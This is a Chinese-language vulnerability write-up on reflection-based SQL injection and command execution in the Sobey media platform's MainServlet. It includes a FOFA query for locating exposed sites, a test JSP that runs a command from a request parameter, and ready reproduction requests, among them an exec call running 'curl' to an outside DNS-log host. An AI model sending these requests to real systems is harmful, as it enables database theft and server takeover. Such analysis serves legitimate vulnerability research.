---
title: "索贝融媒体 MainServlet 反射调用致SQL注入与命令执行漏洞"
source: https://mrxn.net/jswz/sobey-MainServlet-sqli-rce.html
asset_dir: embedded-base64
---

# 漏洞简介

索贝融媒体是一款专业的媒体内容管理与发布平台，广泛应用于新闻机构的内容生产、编辑、存储和多渠道分发等业务场景。该平台的MainServlet组件存在反射调用缺陷，获得授权的攻击者可通过精心构造的请求参数触发不安全的反射调用机制，绕过输入验证和安全防护，直接执行任意SQL查询和[系统命令](https://mrxn.net/tag/rce)。此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")可能导致攻击者未授权访问敏感数据库信息、篡改或删除关键内容，甚至在服务器上执行任意代码，完全控制系统资源，造成严重的信息泄露、业务中断和系统安全风险。

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

先看 web.xml 里对 `MainServlet` 的定义

```
<!-- 配置框架的主Servlet -->
<servlet>
    <servlet-name>MainServlet</servlet-name>
    <servlet-class>com.sobey.cms.framework.MainServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>MainServlet</servlet-name>
    <url-pattern>/MainServlet.jsp</url-pattern>
</servlet-mapping>
```

外部通过URL路径 `MainServlet.jsp` 对`MainServlet`的访问，再看`MainServlet`的内部实现逻辑

深入探索

内容管理

开发工具

开放源代码

```
package com.sobey.cms.framework;

import com.sobey.cms.framework.data.DataCollection;
import com.sobey.cms.framework.extend.ExtendManager;
import com.sobey.cms.framework.utility.LogUtil;
import com.sobey.cms.framework.utility.StringUtil;
import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class MainServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            response.setHeader("Pragma", "No-Cache");
            response.setHeader("Cache-Control", "No-Cache");
            response.setDateHeader("Expires", 0L);
            response.setContentType("text/xml");
            if (Config.ServletMajorVersion == 2 && Config.ServletMinorVersion == 3) {
                response.setContentType("text/xml;charset=utf-8");
            } else {
                response.setCharacterEncoding("UTF-8");
            }

            request.setCharacterEncoding("UTF-8");
            String method = request.getParameter("_ZVING_METHOD");
            String url = request.getParameter("_ZVING_URL");
            if ("".equals(url) || "/".equals(url)) {
                url = "/Index.jsp";
            }

            if ("www.sobeycloud.com".equalsIgnoreCase(request.getServerName()) && "/demo".equalsIgnoreCase(request.getContextPath()) && !"admin".equalsIgnoreCase(User.getUserName()) && this.getServletConfig().getInitParameter(method) != null) {
                LogUtil.getLogger().warn("method:" + method + ",操作：" + this.getServletConfig().getInitParameter(method) + "此操作被拒绝!<br>系统提示：为保证索贝软件Demo站的稳定运行，Demo站中部分删除功能已被屏蔽.");
                DataCollection dcResponse = new DataCollection();
                dcResponse.put("_ZVING_STATUS", "0");
                dcResponse.put("_ZVING_MESSAGE", "此操作被拒绝!<br>系统提示：为保证索贝软件Demo站的稳定运行，Demo站中部分删除功能已被屏蔽.如需要可下载安装程序到本地来试用.<br>下载地址：<a href='http://www.sobeycloud.com/download/program/index.shtml' target='_blank'>下载SCMS</a>");
                response.getWriter().write(dcResponse.toJSON());
                return;
            }

            Current.init(request, response, method);
            if (StringUtil.isEmpty(method)) {
                LogUtil.getLogger().warn("错误的Server.sendRequest()调用，QueryString=" + request.getQueryString() + "，Referer=" + request.getHeader("referer"));
                return;
            }

            String className = method.substring(0, method.lastIndexOf("."));
            Class c = Class.forName(className);
            String LoginClass = Config.getValue("App.LoginClass");
            User.UserData user = (User.UserData)request.getSession().getAttribute("_ZVING_USER");
            if (user == null) {
                user = User.getCurrent();
            }

            if (!Ajax.class.isAssignableFrom(c) && !className.equals("com.sobey.cms.framework.Framework") && !className.equals(LoginClass) && !user.isLogin()) {
                DataCollection dcResponse = new DataCollection();
                dcResponse.put("_ZVING_SCRIPT", "window.top.location='" + Config.getContextPath() + Config.getLoginPage() + "';");
                response.getWriter().write(dcResponse.toJSON());
                return;
            }

            if (!className.equals(LoginClass) && !SessionCheck.check(c, user)) {
                DataCollection dcResponse = new DataCollection();
                dcResponse.put("_ZVING_MESSAGE", "不允许越权访问!");
                response.getWriter().write(dcResponse.toJSON());
                return;
            }

            if (ExtendManager.hasAction("BeforePageMethodInvoke")) {
                ExtendManager.executeAll("BeforePageMethodInvoke", new Object[]{method});
            }

            Current.invokeMethod(method, (Object[])null, request.getSession());
            if (ExtendManager.hasAction("AfterPageMethodInvoke")) {
                ExtendManager.executeAll("AfterPageMethodInvoke", new Object[]{method});
            }

            response.getWriter().write(Current.getResponse().toJSON());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
```

其中关键点在下面的**Class.forName**反射调用部分

```
String className = method.substring(0, method.lastIndexOf("."));
Class c = Class.forName(className);
```

`className`提取自`_ZVING_METHOD`参数当中最后一个小数点之前的部分，如\_ZVING\_METHOD=test.xxx,那么className就等于test。

然后使用**Class.forName**来反射加载提取后的类。

接着是下面对于反射的类进行判断

```
if (!Ajax.class.isAssignableFrom(c) && !className.equals("com.sobey.cms.framework.Framework") && !className.equals(LoginClass) && !user.isLogin()) {
    DataCollection dcResponse = new DataCollection();
    dcResponse.put("_ZVING_SCRIPT", "window.top.location='" + Config.getContextPath() + Config.getLoginPage() + "';");
    response.getWriter().write(dcResponse.toJSON());
    return;
}
```

App.LoginClass来自框架的定义

```
<config name="LoginClass">com.sobey.cms.system.Login</config>
```

如果是`className`不是来自Ajax的子类或者`_ZVING_METHOD`不等于**com.sobey.cms.framework.Framework**，或者`_ZVING_METHOD`不等于`com.sobey.cms.system.Login`，亦或者没有登录，就返回`{"_ZVING_STATUS":0,"_ZVING_MESSAGE":"系统发生内部错误，操作失败:com.sobey.cms.framework.utility.CommandExecutorUtil.exec"}{"_ZVING_SCRIPT":"window.top.location='/sobey-mchEditor/Login.jsp';"}`

同时也会对当前会话的权限进行校验

```
if (!className.equals(LoginClass) && !SessionCheck.check(c, user)) {
    DataCollection dcResponse = new DataCollection();
    dcResponse.put("_ZVING_MESSAGE", "不允许越权访问!");
    response.getWriter().write(dcResponse.toJSON());
    return;
}
```

OK，自此流程分析完毕

## 命令执行-RCE

下面来看上面已经提到过的危险类`CommandExecutorUtil`，其中包含直接[执行命令](https://mrxn.net/tag/rce)的方法**exec**

```
package com.sobey.cms.framework.utility;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class CommandExecutorUtil {
    public static boolean exec(String command) {
        return exec(command, (String[])null, (String)null);
    }

    public static boolean exec(String command, String[] args, String dir) {
        try {
            LogUtil.getLogger().info("command:" + command + " args:" + args + " dir:" + dir);
            Process process = null;
            if (args == null && dir == null) {
                process = Runtime.getRuntime().exec(command);
            } else {
                process = Runtime.getRuntime().exec(command, args, new File(dir));
            }

            InputStream is1 = process.getInputStream();
            InputStream is2 = process.getErrorStream();
            BufferedReader br2 = new BufferedReader(new InputStreamReader(is2));
            StringBuffer buf = new StringBuffer();
            String line = null;

            while((line = br2.readLine()) != null) {
                buf.append(line);
            }

            LogUtil.getLogger().info("VideoUtil 输出为：" + buf);
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }
}
```

直接获取`command`参数调用`Runtime.getRuntime().exec` [执行命令](https://mrxn.net/tag/rce)，[命令执行](https://mrxn.net/tag/rce "标签：命令执行")结果直接记录在日志文件里。

根据上面的[命令执行](https://mrxn.net/tag/rce "标签：命令执行")类可以写一个jsp来测试

```
<%@ page language="java" import="com.sobey.cms.framework.utility.CommandExecutorUtil" pageEncoding="UTF-8"%>
<%
    // 从请求参数获取命令
    String cmd = request.getParameter("cmd");

    if (cmd != null && !cmd.trim().isEmpty()) {
        boolean result = CommandExecutorUtil.exec(cmd);
        out.println("执行命令: " + cmd + "<br>");
        out.println("执行结果: " + result);
    } else {
        out.println("请在URL中传入参数 cmd，例如：?cmd=ls");
    }
%>
```

> 该命令执行没有回显，只有成功true或者失败false

## SQL注入

如果调用`com.sobey.cms.framework.Framework` 类下面的方法如`getCodeData`方法

```
public void getCodeData() {
    String CodeType = this.Request.getString("_ZVING_CODETYPE");
    String className = Config.getValue("App.CodeSource");
    String methodName = className.substring(className.lastIndexOf(".") + 1);
    className = className.substring(0, className.lastIndexOf("."));

    try {
        Class c = Class.forName(className);
        Method m = c.getMethod(methodName, String.class, DataCollection.class);
        Object d = m.invoke((Object)null, CodeType, this.Request);
        if (d != null) {
            this.Response.put("CodeData", (DataTable)d);
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

}
```

参数`_ZVING_CODETYPE`的值赋值给`CodeType`，同时友反射加载`App.CodeSource`，而`App.CodeSource` 来自

```
<config name="CodeSource">com.sobey.cms.platform.pub.PlatformCodeSource</config>
```

然后通过`c.getMethod(methodName, String.class, DataCollection.class);` 来调用其子方法

```
public class PlatformCodeSource extends CodeSource {
    public DataTable getCodeData(String codeType, Mapx params) {
        DataTable dt = null;
        String conditionField = params.getString("ConditionField");
        String conditionValue = params.getString("ConditionValue");
        if ("District".equals(codeType)) {
            QueryBuilder qb = new QueryBuilder("select code,name from ZDDistrict where " + conditionField + "=?", conditionValue);
            String parentCode = params.getString("ParentCode");
            if (StringUtil.isNotEmpty(parentCode)) {
                qb.append(" and Code like ?");
                if (!parentCode.startsWith("11") && !parentCode.startsWith("12") && !parentCode.startsWith("31") && !parentCode.startsWith("50")) {
                    if (parentCode.endsWith("0000")) {
                        qb.add(parentCode.substring(0, 2) + "%");
                        qb.append(" and TreeLevel=2");
                    } else if (parentCode.endsWith("00")) {
                        qb.add(parentCode.substring(0, 4) + "%");
                        qb.append(" and TreeLevel=3");
                    } else {
                        qb.add("#");
                    }
                } else {
                    qb.add(parentCode.substring(0, 2) + "%");
                    qb.append(" and TreeLevel=3");
                }
            } else if (conditionField.equals("1")) {
                return new DataTable();
            }

            dt = qb.executeDataTable();
        } else if ("User".equals(codeType)) {
            QueryBuilder qb = new QueryBuilder("select UserName,UserName as 'Name',RealName,isBranchAdmin from ZDUser where " + conditionField + "=?", conditionValue);
            dt = qb.executeDataTable();
        } else {
            Mapx map = CacheManager.getMapx("Code", codeType);
            if (conditionValue.equals("2")) {
                map.remove("01");
            }

            if (map != null) {
                dt = map.toDataTable();
            }
        }

        return dt;
    }
}
```

在`PlatformCodeSource`类下的`getCodeData`方法中，当`_ZVING_CODETYPE`等于`District`或`User`时，参数 `ConditionField`的值被直接接拼接进SQL语句中，无任何过滤或校验，从而导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。

# 漏洞复现

> 需要合法session

## SQL注入

```
GET /sobey-mchEditor/MainServlet.jsp?ConditionField=1%3d1%20OR%20SQLI_POC--%20-&ConditionValue=1&_ZVING_CODETYPE=District&_ZVING_METHOD=com.sobey.cms.framework.Framework.getCodeData HTTP/1.1
Host: sobey.mrxn.net
Cookie: JSESSIONID=xxxxxx
```

## 命令执行

```
POST /sobey-mchEditor/MainServlet.jsp?_ZVING_METHOD=com.sobey.cms.framework.utility.CommandExecutorUtil.exec HTTP/1.1
Host: sobey.mrxn.net
Cookie: JSESSIONID=xxxxx

command=curl xx.dnslog.pt
```
